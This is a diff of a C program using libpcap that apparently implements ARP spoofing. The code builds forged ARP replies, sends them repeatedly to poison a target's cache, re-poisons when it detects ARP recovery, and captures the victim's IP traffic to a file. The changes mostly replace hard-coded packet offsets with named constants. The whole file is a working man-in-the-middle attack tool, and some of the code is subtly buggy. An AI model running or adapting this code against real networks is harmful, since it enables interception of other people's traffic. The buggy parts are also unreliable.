@@ -7,17 +7,24 @@
 #include <time.h>
 
 #define spoofing_period 1
+#define eth_src_mac 6
 #define eth_protocol 12
 #define eth_len 14
-
+#define arp_operation 20
+#define arp_src_mac 22
+#define arp_dst_mac 32
+#define arp_src_ip 28
+#define arp_dst_ip 38
+#define arp_packet_len 42
 
 enum protoc{
     ipv4, ipv6, tcp, arp, arp_request, arp_reply
 };
-
+/*
 enum arp__{
     arp_request, arp_reply
 };
+*/
 
 unsigned int protocol_num[] = {0x0800, 0x0000, 0x06, 0x0806, 0x1, 0x2}; //not right
 
@@ -138,7 +145,6 @@ void tcp_print(struct tcp_header * th)
 }
 
 
-
 int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac)
 {
     //const u_char * packet = packet_;
@@ -151,13 +157,13 @@ int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac
     eh = (struct ether_header *)(packet);
 
     //if not arp drop
-    if(ntohs(*  ((unsigned short *)(packet+12))  ) != protocol_num(arp))
+    if(ntohs(  (eh->ether_type)  ) != protocol_num[arp])
     {
-        printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
+        printf("protocol : %2x\n", ntohs(  (eh->ether_type)  ));
         return 0;
     }
     //if not reply drop
-    if(ntohs(*(unsigned short *)(packet+20)) != protocol_num(arp_reply))
+    if(ntohs(*(unsigned short *)(packet + arp_operation )) != protocol_num[arp_reply])
     {
         printf("reply? : %2x\n", ntohs(*(unsigned short *)(packet+20)));
         return 0;
@@ -168,21 +174,19 @@ int arp_reply_extract(const u_char * packet, char* DIP, struct ether_addr * dmac
         return 0;
     */
     inet_pton(AF_INET, DIP, &(sa.sin_addr));
-    if((*(unsigned int *)(packet+28)) != (*(unsigned int *)(&(sa.sin_addr))) )
+    if((*(unsigned int *)(packet+arp_src_ip)) != (*(unsigned int *)(&(sa.sin_addr))) )
     {
-        printf("recieved ip : %x\n", (*(unsigned int *)(packet+28)));
+        printf("recieved ip : %x\n", (*(unsigned int *)(packet+arp_src_ip)));
         printf("target ip : %x\n", (*(unsigned int *)(&(sa.sin_addr))));
         return 0;
     }
 
-    memcpy(dmac, packet+22, sizeof(dmac));
+    memcpy(dmac, packet+arp_src_mac, sizeof(dmac));
     //dmac = (struct ether_addr *)(packet + 22);
     return 1;
 }
 
-
-
-void arp_r_base_setting(u_char * packet, arp__ rr)
+void arp_r_base_setting(u_char * packet, protoc rr)
 {
     int i;
     for(i = 0; i<6; i++)
@@ -209,7 +213,7 @@ void arp_r_base_setting(u_char * packet, arp__ rr)
         packet[21] = 0x01;
     else if (rr == arp_reply)
         packet[21] = 0x02;
-    for(i = 32; i<38; i++)
+    for(i = arp_dst_mac; i<38; i++)
         packet[i] = 0x00;
 
 
@@ -218,7 +222,6 @@ void arp_r_base_setting(u_char * packet, arp__ rr)
     //packet 28~31 : SIP
     //packet 39~42 : DIP
 }
-
 
 
 void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
@@ -250,7 +253,7 @@ void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
     //packet 22~27 : SMAC
     //packet 28~31 : SIP
     //packet 38~41 : DIP
-    memcpy(packet+28, &(sa.sin_addr), 4*sizeof(char));
+    memcpy(packet+arp_src_ip, &(sa.sin_addr), 4*sizeof(char));
 
     struct ether_addr smac;
 
@@ -258,13 +261,13 @@ void arp_request_setting(u_char *packet, char * DIP, char *SMAC, char *SIP)
            &(smac.ether_addr_octet[0]), &(smac.ether_addr_octet[1]),
            &(smac.ether_addr_octet[2]), &(smac.ether_addr_octet[3]),
            &(smac.ether_addr_octet[4]), &(smac.ether_addr_octet[5]));
-    memcpy(packet+6, &(smac), sizeof(smac));
-    memcpy(packet+22, &(smac), sizeof(smac));
+    memcpy(packet+eth_src_mac, &(smac), sizeof(smac));
+    memcpy(packet+arp_src_mac, &(smac), sizeof(smac));
 
     //DIP
     inet_pton(AF_INET, DIP, &(sa.sin_addr));
-    memcpy(packet+38, &(sa.sin_addr), 4*sizeof(char));
-    for(i=0; i<42; i++)
+    memcpy(packet+arp_dst_ip, &(sa.sin_addr), 4*sizeof(char));
+    for(i=0; i<arp_packet_len; i++)
         printf("%x ", *(packet + i));
     printf("\n\n");
 }
@@ -276,17 +279,21 @@ int arp_recovery_detection(const u_char * packet, char * DIP)
         return 0;
 
     struct sockaddr_in sa;
+    struct ether_header * eh;
+
+    eh = (struct ether_header *)(packet);
+
     bool right_sip = false;
     bool right_dip = false;
 
     //if not arp drop
-    if(ntohs(*  ((unsigned short *)(packet+12))  ) != 0x0806)
+    if(ntohs(  (eh->ether_type)  ) != protocol_num[arp])
     {
         //printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
         return 0;
     }
     //if not request drop
-    if(ntohs(*(unsigned short *)(packet+20)) != 0x0001)
+    if(ntohs(*(unsigned short *)(packet+arp_operation)) != arp_request)
     {
         //printf("reply? : %2x\n", ntohs(*(unsigned short *)(packet+20)));
         return 0;
@@ -299,8 +306,8 @@ int arp_recovery_detection(const u_char * packet, char * DIP)
     */
     inet_pton(AF_INET, DIP, &(sa.sin_addr));
 
-    right_sip = ( (*(unsigned int *)(packet+28)) == (*(unsigned int *)(&(sa.sin_addr))) );
-    right_dip = ( (*(unsigned int *)(packet+38)) == (*(unsigned int *)(&(sa.sin_addr))) );
+    right_sip = ( (*(unsigned int *)(packet+arp_src_ip)) == (*(unsigned int *)(&(sa.sin_addr))) );
+    right_dip = ( (*(unsigned int *)(packet+arp_dst_ip)) == (*(unsigned int *)(&(sa.sin_addr))) );
 
     if( (right_sip || right_dip) )
     {
@@ -325,8 +332,8 @@ void arp_spoof(u_char * packet, char * DIP, struct ether_addr dmac, char *SMAC, 
     //packet 6~11 : SMAC
     //packet 22~27 : SMAC
     //packet 28~31 : SIP
-    //packet 39~42 : DIP
-    memcpy(packet+28, &(sa.sin_addr), 4*sizeof(char));
+    //packet 38~42 : DIP
+    memcpy(packet+arp_src_ip, &(sa.sin_addr), 4*sizeof(char));
 
     struct ether_addr smac;
 
@@ -334,18 +341,18 @@ void arp_spoof(u_char * packet, char * DIP, struct ether_addr dmac, char *SMAC, 
            &(smac.ether_addr_octet[0]), &(smac.ether_addr_octet[1]),
            &(smac.ether_addr_octet[2]), &(smac.ether_addr_octet[3]),
            &(smac.ether_addr_octet[4]), &(smac.ether_addr_octet[5]));
-    memcpy(packet+6, &(smac), sizeof(smac));
-    memcpy(packet+22, &(smac), sizeof(smac));
+    memcpy(packet+eth_src_mac, &(smac), sizeof(smac));
+    memcpy(packet+arp_src_mac, &(smac), sizeof(smac));
 
     //DIP
     inet_pton(AF_INET, DIP, &(sa.sin_addr));
-    memcpy(packet+38, &(sa.sin_addr), 4*sizeof(char));
+    memcpy(packet+arp_dst_ip, &(sa.sin_addr), 4*sizeof(char));
 
 
     //setting DMAC
     memcpy(packet, &(dmac), sizeof(dmac));
-    memcpy(packet+32, &(dmac), sizeof(dmac));
-    for(i=0; i<42; i++)
+    memcpy(packet+arp_dst_mac, &(dmac), sizeof(dmac));
+    for(i=0; i<arp_packet_len; i++)
         printf("%x ", *(packet + i));
     printf("\n\n");
 }
@@ -367,11 +374,14 @@ int arp_get_sender_packet(const u_char * packet, char * DIP, FILE *fp)
     struct sockaddr_in sa;
     int i;
 
+    struct ether_header * eh;
+    eh = (struct ether_header *)(packet);
+
     if(packet==NULL)
         return 0;
 
     //if not ip drop
-    if(ntohs(*  ((unsigned short *)(packet+12))  ) != 0x0800)
+    if(ntohs(  (eh->ether_type)  ) != protocol_num[ipv4])
     {
         //printf("protocol : %2x\n", ntohs(*(unsigned short *)(packet+12)));
         return 0;
@@ -563,7 +573,7 @@ int main(int argc, char * argv[]) //int main(int argc, char *argv[])
    while(1)
    {
 
-       pcap_sendpacket(handle, arp_request_packet, 42);
+       pcap_sendpacket(handle, arp_request_packet, arp_packet_len);
        printf("sent arp_reqeust\n");
 
        packet = pcap_next(handle, &header);
@@ -584,7 +594,7 @@ int main(int argc, char * argv[]) //int main(int argc, char *argv[])
 
    while(1)
    {
-       pcap_sendpacket(handle, arp_request_packet, 42);
+       pcap_sendpacket(handle, arp_request_packet, arp_packet_len);
        printf("sent arp_reqeust\n");
 
        packet = pcap_next(handle, &header);
@@ -646,7 +656,7 @@ int main(int argc, char * argv[]) //int main(int argc, char *argv[])
                break;
        }
        printf("1 sec past\n");
-       pcap_sendpacket(handle, arp_spoof_packet, 42);
+       pcap_sendpacket(handle, arp_spoof_packet, arp_packet_len);
        printf("send spoof\n");
 
        //sleep(spoofing_period);
